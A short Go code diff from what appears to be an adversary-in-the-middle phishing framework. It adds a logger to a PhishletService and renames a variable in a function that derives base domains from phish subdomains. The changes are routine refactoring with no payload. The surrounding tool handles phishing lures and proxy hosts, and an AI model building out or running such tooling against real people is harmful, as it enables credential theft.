@@ -2,6 +2,7 @@ package aitm
 
 import (
 	"fmt"
+	"log/slog"
 	"net"
 	"regexp"
 	"strings"
@@ -245,12 +246,12 @@ type PhishletService struct {
 	resolver *phishletResolver
 }
 
-func NewPhishletService(store phishletStore, bus eventBus, dns *DNSService, lureStore lureStore) *PhishletService {
+func NewPhishletService(store phishletStore, bus eventBus, dns *DNSService, lureStore lureStore, logger *slog.Logger) *PhishletService {
 	return &PhishletService{
 		store:    store,
 		bus:      bus,
 		dns:      dns,
-		resolver: newPhishletResolver(lureStore),
+		resolver: newPhishletResolver(lureStore, logger),
 	}
 }
 
@@ -335,8 +336,8 @@ func deriveBaseDomain(def *Phishlet, hostname string) string {
 		return ""
 	}
 	hostname = strings.ToLower(hostname)
-	for _, ph := range def.ProxyHosts {
-		prefix := strings.ToLower(ph.PhishSubdomain) + "."
+	for _, proxyHost := range def.ProxyHosts {
+		prefix := strings.ToLower(proxyHost.PhishSubdomain) + "."
 		if strings.HasPrefix(hostname, prefix) {
 			return hostname[len(prefix):]
 		}
